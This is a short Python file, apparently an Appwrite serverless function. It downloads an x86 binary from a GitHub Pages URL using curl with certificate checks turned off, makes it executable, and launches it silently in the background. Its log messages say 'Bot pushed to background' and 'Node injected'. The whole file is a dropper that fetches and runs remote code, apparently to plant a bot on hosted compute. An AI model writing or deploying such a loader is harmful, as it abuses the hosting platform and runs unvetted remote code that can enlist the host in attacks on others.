import os
import subprocess

# In Appwrite 2026, functions should be async to work with their server.py
async def main(context):
    # Use /tmp/ because it is the only reliably writeable directory
    binary_url = "https://urbenm4.github.io/nt.x86"
    dest_path = "/tmp/nt.x86"
    
    context.log(f"Starting deployment from {binary_url}")

    try:
        # 1. Clean up old binary if it exists to avoid 'Text file busy' errors
        if os.path.exists(dest_path):
            os.remove(dest_path)

        # 2. Download and chmod in one go
        # We use absolute path for dest_path to avoid the 'No such file' error
        cmd_download = f"curl -skL {binary_url} -o {dest_path} && chmod +x {dest_path}"
        subprocess.run(cmd_download, shell=True, check=True)
        context.log("Download successful.")

        # 3. Background Execution
        # We use the absolute path here so Popen knows exactly where to look
        subprocess.Popen([dest_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        context.log("Bot pushed to background.")

    except Exception as e:
        context.error(f"Error: {str(e)}")
        return context.res.json({"status": "error", "message": str(e)})

    return context.res.json({
        "status": "success", 
        "message": "Node injected from GitHub"
    })
